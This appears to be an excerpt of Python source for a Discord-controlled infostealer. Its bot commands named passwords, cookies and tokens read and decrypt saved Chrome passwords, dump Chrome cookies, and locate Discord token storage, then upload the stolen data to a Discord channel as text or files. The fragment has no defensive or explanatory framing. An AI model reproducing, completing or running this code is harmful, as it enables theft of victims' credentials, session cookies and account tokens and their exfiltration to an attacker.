...
async def passwords(ctx):
    ...
    try:
        ...
        if not master_key:
            await ctx.send("❌ Could not retrieve Chrome master key")
            return
        ...
        for row in cursor.fetchall():
            ...
            if username or decrypted_password:
                passwords_data.append(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n{'─'*40}")
        ...
        if passwords_data:
            output = "\n".join(passwords_data[:20])
            
            if len(output) > 1900:
                output_file = io.BytesIO(output.encode())
                await ctx.send(file=discord.File(output_file, filename="passwords.txt"))
            else:
                await ctx.send(f"```\n{output}\n```")
        else:
...
async def cookies(ctx):
    ...
    try:
        cookies_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
        ...
        cookies_data = []
        for row in cursor.fetchall():
            cookies_data.append(f"Host: {row[0]}\nName: {row[1]}\nValue: {row[2][:50]}...\n{'─'*40}")
        ...
        if cookies_data:
            output = "\n".join(cookies_data)
            output_file = io.BytesIO(output.encode())
            await ctx.send(file=discord.File(output_file, filename="cookies.txt"))
        else:
...
async def tokens(ctx):
    ...
    try:
        ...
        paths = [
            os.path.join(roaming_appdata, "Discord", "Local Storage", "leveldb"),
            os.path.join(roaming_appdata, "discordcanary", "Local Storage", "leveldb"),
            os.path.join(roaming_appdata, "discordptb", "Local Storage", "leveldb"),
        ]
